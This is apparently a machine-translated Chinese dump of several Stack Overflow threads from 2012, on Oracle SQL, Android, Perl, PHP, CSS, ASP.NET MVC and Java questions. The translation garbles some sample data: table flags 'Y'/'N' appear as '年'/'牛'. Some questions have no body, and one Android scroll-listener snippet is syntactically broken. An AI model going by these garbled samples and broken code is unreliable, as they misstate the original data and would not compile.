但是你看，这里已经有问题了

*如果缓冲区的任何给定级别的每个元素都应该是相同的类型*，则 buffer2 是数组数组的数组。

这意味着`item`是一个数组数组，并且`item[0]`是一个数组，而不是一个元素。这并不意味着该语句不会*以某种方式起作用*，但是，除非您试图赢得某种 javascript 混淆竞赛，否则这不是好的代码，并且可能不是预期的。

编辑：这确实是一种奇怪的遍历数组的方式；也许在这个宇宙中存在某种理由以这种方式遍历数组，但如果您的数组*中有任何元素会以某种方式评估为 false*，它甚至不会遍历所有元素。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:40:47.940

由于您显示了部分代码，因此无法完全理解您的代码。如果大部分代码是正确的，建议像这样交换 array.push：

> dataset.push(cities.clusters[item[0]] || 0);
> 
> dataset2.push(cities.clusters[item[0]] || 0);

如果 buffer 和 buffer2 不相同，这应该可以工作。

# sql - 比较两个表中的记录并突出显示差异

> ID：13916969
> 
> 赞同：4
> 
> 时间：2012-12-17T15:25:13.087
> 
> 标签：sql, oracle

我有两个具有完全相同列的表

**表 A**

```
标识标志
1年
2年
3 牛
4 牛
```

**表 B**

```
标识标志
1年
2
3 牛
4
```

我想在 Oracle 中编写一个选择查询，它将显示表 A 中的所有行，其中`FLAG`列与表 B 不同但具有匹配的 ID 列

结果应如下所示。

```
标识标志
2年
4 牛
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:34:34.187

“表 A 中的所有行......作为表 B 具有匹配 ID 的列”：

```
FROM a JOIN b USING (id) 
```

“其中 FLAG 列不一样”：

```
WHERE a.flag != b.flag 
   OR (a.flag IS NULL AND b.flag IS NOT NULL)
   OR (b.flag IS NULL AND a.flag IS NOT NULL) 
```

所以，查询将是

```
SELECT id, a.flag
  FROM a JOIN b USING (id)
WHERE a.flag != b.flag 
   OR (a.flag IS NULL AND b.flag IS NOT NULL)
   OR (b.flag IS NULL AND a.flag IS NOT NULL) 
```

-`WHERE`条件很丑陋，但有必要捕获表 b 具有`NULL`- 值但没有 - 值的情况，或者相反......

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T18:50:18.377

这个在oralce中工作..因为列中有null。它不能直接比较，所以需要使用**NVL（）**或等效函数

```
select a1.* from table_a a1,table_b b 
where A1.id=B.id
and nvl(a1.flag,'y')<>nvl(b.flag,'y') 
```

请参考这个 sqlfiddle：[http ://sqlfiddle.com/#!4/241de/1](http://sqlfiddle.com/#!4/241de/1)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T15:35:29.443

这会做，

```
 select Table_A.id,Table_A.FLAG from 
Table_A join Table_b on Table_A.id=Table_b.id 
where Table_A.FLAG!=Table_b.FLAG 
or (Table_b.FLAG is null and table_a.flag is not null); 
```

[sqlfiddle](http://sqlfiddle.com/#!4/241de/5)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T15:28:25.110

怎么样

```
 SELECT * 
    FROM TABLEA 
      INNER JOIN TABLEB
      ON TABLEA.ID = TABLEB.ID
    WHERE TABLEA.Flag != TABLEB.FLAG
       OR TABLEB.FLAG IS NULL 
```

[演示](http://sqlfiddle.com/#!4/cc94c/4)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-17T15:30:10.990

1.  如果一行在表 A 中而不在表 B 中怎么办？你还想展示它吗？这将帮助您决定是要进行内部联接还是外部联接。

假设是这种情况，您可以使用..获取详细信息

```
select a.id, a.flag, b.flag
  from table_a a,
       table_b b
  where a.id = b.id(+) 
```

由于您需要标志不相等的行..

```
select a.id, a.flag, b.flag
  from table_a a,
       table_b b
  where a.id = b.id(+)
    and a.flag <> b.flag 
```

还要检查标志是否可以为空，在这种情况下，查询可能需要稍作更改。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-17T15:31:36.497

```
SELECT  a.*
FROM    tableA a
        LEFT JOIN tableB b
            ON a.id = b.ID AND
                a.FLAG = b.FLAG
WHERE   b.ID IS NULL 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!4/da4a1/4)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-18T13:25:39.070

在我看来，你是在开玩笑 :) 在这种情况下，Oracle 有特殊的 MINUS 运算符。 [证明链接](http://docs.oracle.com/cd/B19306_01/server.102/b14200/queries004.htm)

所以答案非常简短

```
select id, flag from a
minus
select id, flag from b 
```

[SQLFiddle](http://www.sqlfiddle.com/#!4/4bcc5/1)

PS对不起-或者表B中必须有具有相应ID的记录？然后看下面

```
select id, flag from a where id in (select id from b)
minus
select id, flag from b 
```

[SQLFiddle](http://www.sqlfiddle.com/#!4/4bcc5/2)

# android - Android 适配器的性能

> ID：13916971
> 
> 赞同：0
> 
> 时间：2012-12-17T15:25:26.987
> 
> 标签：android, performance, adapter

我有一个数据库。例如，它包含两个表：部门和员工。两张表都有很多东西。数据将填充到`ExpandableListView`. 现在我使用自定义适配器扩展`CursorTreeAdapter`. 这种情况已经足够好了，但有时它的运行速度比我想要的要慢。性能是否取决于适配器类型？如果是这样，哪个适配器更好？

**代码。**

```
private class MyAdapter extends CursorTreeAdapter implements OnClickListener {

    public MyAdapter(Cursor cursor, Context context) {
        super(cursor, context);
        // TODO Auto-generated constructor stub
    }

    @Override
    public void onClick(View v) {
        // TODO Auto-generated method stub

    }

    @Override
    protected Cursor getChildrenCursor(Cursor groupCursor) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    protected View newGroupView(Context context, Cursor cursor, boolean isExpanded, ViewGroup parent) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    protected void bindGroupView(View view, Context context, Cursor cursor, boolean isExpanded) {
        // TODO Auto-generated method stub

    }

    @Override
    protected View newChildView(Context context, Cursor cursor, boolean isLastChild, ViewGroup parent) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    protected void bindChildView(View view, Context context, Cursor cursor, boolean isLastChild) {
        // TODO Auto-generated method stub

    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:48:42.927

我认为这可能会导致您的部分放缓：

```
 Cursor indicatorsCursor = getActivity().getContentResolver().query(
                JsonDataProvider.Uris.IND_BY_BULLET_AND_COMPLEXITY, null, null,
                selectionArgs, null); 
```

您不应该在`getView`方法中拉动光标/运行查询......这可能是您速度变慢的原因，因为您正在为列表中可见的每个视图执行此操作，然后在滚动时再次为每个视图执行此操作。

如果你必须这样做，那就聪明地去做。在停止滚动之前不要拉光标。放入一个滚动监听器和一个标志。滚动时，将标志设置为 true 并将适配器的那些数据密集位包含在一个`if`语句中，该语句将在设置标志时跳过它们。完成滚动后，清除标志并使用`notifyDataSetChanged`强制重绘可见列表项（现在将执行 db 查询，因为您没有滚动）。

在您的列表视图上设置监听器：

```
listView.setOnScrollListener(new OnScrollListener() {   
    public void onScroll(AbsListView view, int firstVisible,   
    int visibleCount, int total) {   
        public void onScrollStateChanged(AbsListView view, int scrollState) {   
            if (scrollState != 0)   
                listView.getAdapter().isScrolling = true;   
            else {   
                listView.getAdapter().isScrolling = false;  
                listView.getAdapter().notifyDataSetChanged();  
            }  
        }  
    }); 
```

并在您的适配器中使用以下代码包围适当的代码：

```
if (!isScrolling) {
    // processor intensiver code here
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:47:40.177

看到您实际上正在使用视图回收，另一个选项是限制列表中的行数。这可以使用一个名为[**Pull to Refresh**](https://github.com/chrisbanes/Android-PullToRefresh)的流行库来完成，因此您可以在单个页面中放置 10-20 行，然后当用户拉动时，您可以再加载 10-20 行，因此 UI 不会变慢。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-17T15:38:47.237

也许您将数据绑定到视图的方式没有优化，即您可能有 1000 行数据要在列表视图中显示，您不需要创建 1000 个视图来显示您的每一行数据，因为列表视图只会显示屏幕中可以看到的视图数量，所以 android 做了一个聪明的事情，就是重用已经滚动出屏幕的视图，当你绑定你的数据时，你应该检查是否传递给将数据绑定到视图的方法的视图参数为空，如果是，则创建新的，如果不重用它。

为了更好地理解观看此视频：[http ://www.youtube.com/watch?v=wDBM6wVEO70](http://www.youtube.com/watch?v=wDBM6wVEO70)

# perl - 使用拆分提取月、日、年

> ID：13916977
> 
> 赞同：3
> 
> 时间：2012-12-17T15:25:44.977
> 
> 标签：perl

我正在尝试从下面的字符串中提取日期、月份和年份。

```
my $test_str = "Jan 01, 2004    Feb 01, 2004    Mar 01, 2004    Apr 01, 2004    May 01, 2004";
foreach $s (split('\t', $test_str)) {
   my ($m, $d, $y) = split('[\s|,\s]');
   print ("$m=$d=$y\n");
} 
```

当我打印输出时， $y 总是空的。难道我做错了什么？我的正则表达式是

```
[\s|,\s] # match a space or space and a comma 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-17T15:31:17.020

您的`split`正则表达式`[\s|,\s]`是一个字符类（由`[]`方括号表示），这意味着：*“拆分为单个字符，即空格、管道`|`、逗号或空格（再次）”*。您将字符串拆分`Jan 01, 2004`为四个字符串：

```
"Jan"
"01"
""        # comma + whitespace creates empty string
"2004" 
```

您还拆分了`$_`变量，但我认为这是一个错字。

要解决您的问题，请将该行更改为：

```
my ($m, $d, $y) = split(/[\s,]+/, $s); 
```

如您所见，`+`量词的使用将去除多个连续的逗号或空格。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T15:58:00.120

你也可以这样做：`split /,?\s/, $s;`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T15:31:07.317

使用 strict 和 warnings，你会发现这`$s`会导致编译错误。

然后

```
my ($m, $d, $y) = split('\s|,\s', $s ); 
```

我刚刚摆脱了`[]`括号，它工作得很好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T21:47:55.513

`split`在这种情况下，只需在目标字符串中查找所有字母数字子字符串，而不是使用，它会更简单。该`\w`模式匹配字母数字加上下划线字符，并且对于此目的足够准确。

```
use strict;
use warnings;

my $test_str = "Jan 01, 2004\tFeb 01, 2004\tMar 01, 2004\tApr 01, 2004\tMay 01, 2004";

foreach (split /\t/, $test_str) {
   my ($m, $d, $y) = /\w+/g;
   print "$m=$d=$y\n";
} 
```

**输出**

```
Jan=01=2004
Feb=01=2004
Mar=01=2004
Apr=01=2004
May=01=2004 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-17T15:31:23.580

尝试：

```
my $test_str = "Jan 01, 2004    Feb 01, 2004    Mar 01, 2004    Apr 01, 2004    May 01, 2004";
foreach my $s (split(/\t/, $test_str)) {
   my ($m, $d, $y) = split(/\s|,\s/,$s);
   print ("$m=$d=$y\n");
} 
```

这给出了你想要的输出：

```
Jan=01=2004
Feb=01=2004
Mar=01=2004
Apr=01=2004
May=01=2004 
```

正如其他回答的人所提到的，`[\s|,\s]`是一个与`\s`, `|`, or中的一个完全匹配的字符类`,`（这显然不是你想要的）。

# html - 如何保持垂直滚动条始终出现在身体上？

> ID：13916979
> 
> 赞同：2
> 
> 时间：2012-12-17T15:25:59.577
> 
> 标签：html, scrollbar

```
$("#btnGall").click(function() {
    $('#home,#vid,#story,#con').hide();
    $('#gall').slideDown('slow');
}); 
```

在第一行之后，屏幕几乎是空的，滚动条消失，页面的其余部分向右移动。
在第二行之后 - 滚动条再次出现，并再次移动整个页面。
如何防止这种情况？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:27:31.533

你可以申请[`overflow-y`](http://www.w3.org/TR/css3-box/#overflow)html。

```
html { overflow-y: scroll } 
```

如果我记得，将其应用于 body 会导致 IE 上出现双滚动条。

编辑：[这是一个示例](http://jsfiddle.net/5UTbS/1/)。

# android - 我无法获取 GPS 坐标

> ID：13916980
> 
> 赞同：2
> 
> 时间：2012-12-17T15:26:01.100
> 
> 标签：android, google-maps, geolocation, gps, location

我的问题是我无法使用 LocationManager 类和 LocationListener 获取 GPS 坐标。这是我在 OnCreate() 中调用的代码：

```
 locMgr = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
    currentLocListener = new MyLocationListener();
    locMgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, currentLocListener);
    locMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, currentLocListener); 
```

我有一个类 MyLocationListener 实现类 LocationListener

```
public class MyLocationListener implements LocationListener {

@Override
public void onLocationChanged(Location location) {
    // TODO Auto-generated method stub
    String coordinates[] = {""+location.getLatitude(),""+location.getLongitude()};
    double lat = Double.parseDouble(coordinates[0]);
    double lng = Double.parseDouble(coordinates[1]);
    GeoPoint p = new GeoPoint((int)(lat*1E6), (int)(lng*1E6));
    mc.animateTo(p);
    mc.setZoom(19);

    MyMapOverlays marker = new MyMapOverlays(p);
    List<Overlay> listofOverLays = mapview.getOverlays();
    listofOverLays.clear();
    listofOverLays.add(marker);
    mapview.invalidate();
}

@Override
public void onProviderDisabled(String provider) {
    // TODO Auto-generated method stub
    Toast.makeText(getApplicationContext(), "GPS is disabled", Toast.LENGTH_SHORT).show();
}

@Override
public void onProviderEnabled(String provider) {
    // TODO Auto-generated method stub
    Toast.makeText(getApplicationContext(), "GPS is Enabled", Toast.LENGTH_SHORT).show();
}

@Override
public void onStatusChanged(String provider, int status, Bundle extras) {
    // TODO Auto-generated method stub
}} 
```

我可以通过在 DDMS 的 Emulator Control 中模拟位置来获取位置。所以我尝试在我的真实手机上进行测试。当我将它安装在手机上时，虽然我打开了 GPS 和 wifi，但它无法自动获取当前位置。

我尝试在我的真实手机上运行另一个谷歌地图应用程序，它运行良好。我不明白代码有什么问题......谁能帮助我？

**LOGCAT 和调试**

```
DalvikVM[localhost:8631]    
    Thread [<1> main] (Suspended (exception NullPointerException))  
        DashboardActivity$MyLocationListener.onLocationChanged(Location) line: 75   
        LocationManager$ListenerTransport._handleMessage(Message) line: 191 
        LocationManager$ListenerTransport.access$000(LocationManager$ListenerTransport, Message) line: 124  
        LocationManager$ListenerTransport$1.handleMessage(Message) line: 140    
        LocationManager$ListenerTransport$1(Handler).dispatchMessage(Message) line: 99  
        Looper.loop() line: 123 
        ActivityThread.main(String[]) line: 4627    
        Method.invokeNative(Object, Object[], Class, Class[], Class, int, boolean) line: not available [native method]  
        Method.invoke(Object, Object...) line: 521  
        ZygoteInit$MethodAndArgsCaller.run() line: 868  
        ZygoteInit.main(String[]) line: 626 
        NativeStart.main(String[]) line: not available [native method]  
    Thread [<6> Binder Thread #2] (Running) 
    Thread [<5> Binder Thread #1] (Running) 
    Thread [<7> MapService] (Running)   
    Thread [<8> TrafficService] (Running)   
    Daemon Thread [<10> RefQueueWorker@org.apache.http.impl.conn.tsccm.ConnPoolByRoute@4610b970] (Running) 
```

第 75 行给出错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T19:18:09.393

由于您还请求 NETWORK_PROVIDER 的更新，因此您还需要包含权限：

```
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /> 
```

我的猜测是这条线：

```
locMgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, currentLocListener); 
```

...正在抛出 SecurityException，因此注册 GPS_PROVIDER 的以下行永远不会执行。

要进行故障排除，我建议注释掉从 NETWORK_PROVIDER 请求更新的行，然后查看 GPS 是否在设备上工作。或者，您可以尝试在清单中包含上述权限，然后检查以确保您在 onLocationChanged() 方法中收到的位置来自 GPS_PROVIDER。

另外，请尝试消除要转换为字符串数组的第一行。相反，直接为变量赋值：

```
double lat = location.getLatitude();
double lng = location.getLongitude(); 
```

# ios - SmartStore FMDatabase 未打开

> ID：13916982
> 
> 赞同：0
> 
> 时间：2012-12-17T15:26:09.160
> 
> 标签：ios, sdk, salesforce, hybrid

我正在使用 Salesforce 移动 SDK 开发 iOS 混合应用程序。我正在使用 SmartStore 来保存 sObject 信息。虽然我面临一些问题。第一次打开应用程序并登录时，我在注册汤时收到以下消息：“FMDatabase 未打开。” 但是如果我隐藏应用程序并重新打开它，我可以正常使用 SmartStore。显然我想避免这种情况。那么，有什么建议吗...？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T15:26:23.357

问题解决了！只需将 SDK 从 1.3 更新到 1.4

# php - PHP 余数 (%-operator) 意外结果

> ID：13916985
> 
> 赞同：-1
> 
> 时间：2012-12-17T15:26:16.717
> 
> 标签：php

```
# PHP Version 5.2.9  

$a = 0.6/0.1;  
$b = $a % 5;  
print "\$a=$a; \$b=$b\n";  
# result:  
# $a=6; $b=0   # One should expect $b = 1  

$a = 0.6/0.1;  
$a = round($a);  
$b = $a % 5;  
print "\$a=$a; \$b=$b\n";  
# result:  
# $a=6; $b=1  # result as expected 
```

为什么在第一种情况下结果 $b=0 。
为什么 round() 函数似乎解决了这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:33:53.827

用一堆小数位打印两个数字，你会看到问题，这是由于[浮点不精确](http://en.wikipedia.org/wiki/Floating_point#Accuracy_problems)造成的：

第一个`$a`：

```
5.999999999999999111821580299874767661 
```

第二个，之后`round()`：

```
6.000000000000000000000000000000000000 
```

将第一个转换为`int`（就像 mod 运算符在计算其值时所做的那样）结果为`5`，而第二个结果为`6`.

# android - Eclipse CDT 代码分析与 GCC 不一致 - 为什么？

> ID：13916988
> 
> 赞同：3
> 
> 时间：2012-12-17T15:26:22.267
> 
> 标签：android, eclipse, android-ndk, analysis

我喜欢构建与 NDK 一起提供的 Android NDK 示例“native-audio”。NDK 提供的编译器毫无怨言地吞下了它，但 Eclipse 在 file 中显示了几个错误`native-audio-jni.c`。

在下面的代码摘录中，所有静态变量声明都有红色下划线，因为 Eclipse 声称无法解析类型。它们是在文件中定义的，如果我+*左键单击*`OpenSLES.h`文件，Eclipse 会找到它。`Ctrl`

 *请注意，与示例源相比，我修改了包含`hello_clip`和的行`android_clip`——我还将数组声明放在那些“头”文件中（它们只包含逗号分隔的数据），因为 Eclipse 在解析语法时也有问题：

```
static const char array[] = #include"blah.h"; 
```

我尝试了互联网上建议的东西，比如从`eclipse.exe -clean`、清理项目/重建、刷新项目等开始，都没有帮助。

那么，Eclipse 无法解析这些类型的原因/解决方案是什么？

```
#include <assert.h>
#include <jni.h>
#include <string.h>

// for __android_log_print(ANDROID_LOG_INFO, "YourApp", "formatted message");
// #include <android/log.h>

// for native audio
#include <SLES/OpenSLES.h>
#include <SLES/OpenSLES_Android.h>

// for native asset manager
#include <sys/types.h>
#include <android/asset_manager.h>
#include <android/asset_manager_jni.h>

// pre-recorded sound clips, both are 8 kHz mono 16-bit signed little endian

// includes data arrays here
#include "hello_clip.h"
#include "android_clip.h"

// engine interfaces
static SLObjectItf engineObject = NULL;
static SLEngineItf engineEngine;

// output mix interfaces
static SLObjectItf outputMixObject = NULL;
static SLEnvironmentalReverbItf outputMixEnvironmentalReverb = NULL; 
```

（该文件充满了更多这些问题）*

# jquery - wordpress ajax 菜单 - 将“活动”css 标记从移动到

> ID：13916990
> 
> 赞同：0
> 
> 时间：2012-12-17T15:26:29.093
> 
> 标签：jquery, wordpress, menuitem

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:29:16.850

尝试更改此行：

```
echo '<li><a href="' . $gdl_is_home_url . '#section-n' . $section_number . '" id="nav-section' . $section_number . '" class="anchor' . $active . $gdl_is_home_class . '" >'; 
```

至：

```
echo '<li  class="' . $active . '"><a href="' . $gdl_is_home_url . '#section-n' . $section_number . '" id="nav-section' . $section_number . '" class="anchor' . $gdl_is_home_class . '" >'; 
```

# asp.net-mvc - MVC 数据类型错误消息

> ID：13916991
> 
> 赞同：7
> 
> 时间：2012-12-17T15:26:29.653
> 
> 标签：asp.net-mvc

数据类型错误消息不起作用。MVC4 DataType ErrorMessage 似乎不起作用。我有这个 dataannotation 属性：

```
[DataType(DataType.DateTime, ErrorMessage = "Invalid date")]
public override DateTime? BirthDate { get; set; } 
```

但客户端验证返回此错误：

BirthDate 字段必须是日期。

这是 HTML 部分：

```
 <input Value="" class="date" data-val="true" data-val-date="The field BirthDate  must be a date." data-val-required="El campo Fecha nacimiento es obligatorio" id="Patient_BirthDate" name="Patient.BirthDate" type="text" value="" /> 
```

任何想法？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-08-24T23:43:32.993

在 MVC 4 上，我能够使用 Html.ValidationMessageFor 更改视图中的错误消息。
看一个例子：`@Html.ValidationMessageFor(model => model.FechaDesde, "Fecha Inválida")`

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-17T15:43:06.360

**简短回答：**的目的`DataType.DateTime`不是验证您`DateTime`输入的生日属性。这就是原因。它所做的只是在将 DateTime 显示在您的视图上之前对其进行格式化。

您还需要`[Required]`在此之上具有属性。

但是，**我通常更喜欢使用**的是[**Jquery Datepicker**](http://jqueryui.com/demos/datepicker/) ，它甚至不允许用户输入任何文本，而是输入有效日期。

**编辑：**当您在 ASP.NET MVC 4 中使用默认模板装饰模型属性时，`[DataType(DataType.Date)]`会生成一个 type="date" 的输入字段。支持 HTML5 的浏览器（例如 Google Chrome）使用日期选择器呈现此输入字段。

您可以使用代码强制执行此操作：

```
[DataType(DataType.Date)]
[DisplayFormat(DataFormatString = "{0:yyyy-MM-dd}", ApplyFormatInEditMode = true)]
public DateTime? BirthDate { get; set; } 
```

为了正确显示日期，值必须格式化为`2012-09-28`

# java - 如何转换特殊字符，“Fran%c3%a7ais”->“Français”？

> ID：13916992
> 
> 赞同：1
> 
> 时间：2012-12-17T15:26:30.387
> 
> 标签：java, android, encoding, character-encoding, encode

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:28:45.960

尝试[URLDecoder](http://download.java.net/jdk7/archive/b123/docs/api/java/net/URLDecoder.html)：

`URLDecoder.decode(String s)`

根据文档，该功能已弃用，因此您需要使用此功能：

```
public static String decode(String s, String enc) throws UnsupportedEncodingException 
```

例子：

```
String decoded = URLDecoder.decode("Fran%c3%a7ais", "UTF-8"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:28:55.437

这看起来像百分比编码的 UTF-8。对于（百分号）+（十六进制数字）+（十六进制数字）的每个最大序列，首先将其转换为字节，将每对十六进制数字编码一个字节；然后将生成的字节序列解释为实际文本的 UTF-8 编码。